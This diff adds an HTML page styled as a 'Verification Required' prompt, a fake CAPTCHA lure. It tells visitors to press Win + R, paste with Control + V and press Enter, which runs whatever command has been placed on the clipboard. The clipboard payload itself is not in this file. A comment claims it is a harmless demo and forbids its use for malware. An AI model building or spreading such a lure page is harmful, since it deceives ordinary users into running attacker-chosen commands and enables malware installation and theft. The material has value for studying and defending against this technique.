@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification Steps</title>
+  <style>
+    body {
+      background-color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .verify-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #e57200;
+      margin-bottom: 10px;
+    }
+
+    .verify-steps {
+      text-align: left;
+      font-size: 14px;
+      margin: 20px 0;
+    }
+
+    .verify-steps li {
+      margin-bottom: 10px;
+    }
+
+    .btn {
+      background-color: #e57200;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 3px;
+      text-decoration: none;
+      font-size: 14px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #c85f00;
+    }
+  </style>
+</head>
+<body>
+  <div class="verify-title">Verification Required</div>
+  <p>Please complete the following steps:</p>
+  <ol class="verify-steps">
+    <li>Step 1: Press Win + R</li>
+    <li>Step 2: Press Control + V</li>
+    <li>Step 3: Press Enter</li>
+  </ol>
+  <!-- <button class="btn" onclick="completeVerification()">Done</button> -->
+  <script>
+    function completeVerification() {
+      // Let the parent window know we're done with this important tsask.
+//       <!-- This demo shows fake captcha with harmless payload made by iZantr 
+// if you see this outside of github I advise you to leave
+// I also forbid changing and modifying my code without my permission 
+// especially using it for distributing malware
+// this message will be duplicated several times in the code -->
+      window.parent.postMessage({ type: 'verification-complete' }, '*');
+    }
+  </script>
+</body>
+</html>
